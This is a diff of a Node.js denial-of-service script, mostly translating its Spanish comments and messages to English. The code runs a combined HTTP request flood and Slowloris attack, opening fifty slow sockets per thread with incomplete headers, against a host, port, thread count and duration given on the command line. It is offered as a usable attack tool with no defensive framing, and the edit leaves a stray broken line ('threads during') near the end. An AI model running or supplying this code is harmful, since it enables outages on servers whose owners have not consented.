@@ -1,4 +1,4 @@
-// Requiere: npm install axios net
+// Hi
 
 const axios = require('axios');
 const net = require('net');
@@ -9,7 +9,7 @@ const PORT = parseInt(process.argv[4]);
 const DURATION = parseInt(process.argv[5]);
 
 if (process.argv.length !== 6) {
-  console.log('Uso: node script.js <hilos> <host> <puerto> <duracion_seg>');
+  console.log('Command: node script.js <hilos> <host> <puerto> <duracion_seg>');
   process.exit(1);
 }
 
@@ -33,14 +33,14 @@ function buildHeaders() {
   };
 }
 
-// Función para ataque Layer7 clásico (requests GET/POST)
+// Function for classic Layer7 attack (GET/POST requests)
 async function layer7Attack(threadId) {
   const axiosInstance = axios.create({
     timeout: 3000,
     validateStatus: () => true,
   });
 
-  const paths = ['/', '/api', '/login', '/dashboard', '/register'];
+  const paths = ['/', '/', '/', '/', '/']; // put directories where I can send requests
 
   while (Date.now() < END_TIME) {
     const path = paths[Math.floor(Math.random() * paths.length)] + '?v=' + Math.floor(Math.random() * 1000000);
@@ -57,11 +57,11 @@ async function layer7Attack(threadId) {
     } catch (e) {
       console.log(`[Layer7-Hilo-${threadId}] Error: ${e.message}`);
     }
-    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 50) + 20)); // espera entre 20 y 70 ms
+    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 50) + 20)); // wait between 20 and 70 ms
   }
 }
 
-// Función para ataque Slowloris básico
+// Slowloris
 function slowlorisAttack(threadId) {
   const sockets = [];
 
@@ -85,7 +85,7 @@ function slowlorisAttack(threadId) {
         `Accept: */*\r\n` +
         `Connection: keep-alive\r\n`
       );
-      // Enviar datos lentos periódicamente
+      // Send slow data periodically
       const interval = setInterval(() => {
         if (Date.now() > END_TIME) {
           clearInterval(interval);
@@ -93,25 +93,25 @@ function slowlorisAttack(threadId) {
           return;
         }
         try {
-          socket.write('X-a: b\r\n'); // header incompleto para mantener conexión abierta
+          socket.write('X-a: b\r\n'); // incomplete header to keep connection open
         } catch {
           clearInterval(interval);
         }
-      }, 15000); // cada 15 segundos
+      }, 15000); // every 15 seconds
       sockets.push(socket);
     });
   }
 
-  // Abrir muchos sockets
-  for (let i = 0; i < 50; i++) { // 50 conexiones lentas por hilo
+  // Open many sockets
+  for (let i = 0; i < 50; i++) { // 50 slow connections per thread
     createSocket();
   }
 }
 
-// Lanzar ataques combinados
+// Launch combined attacks
 for (let i = 0; i < THREADS; i++) {
   layer7Attack(i);
   slowlorisAttack(i);
 }
-
-console.log(`\n[INFO] Ataque combinado Layer7 + Slowloris iniciado contra ${TARGET_URL} con ${THREADS} hilos durante ${DURATION} segundos.\n`);
+threads during
+console.log(`\n[INFO] Layer7 + Slowloris combo attack initiated against ${TARGET_URL} with ${THREADS} threads during ${DURATION} seconds.\n`);
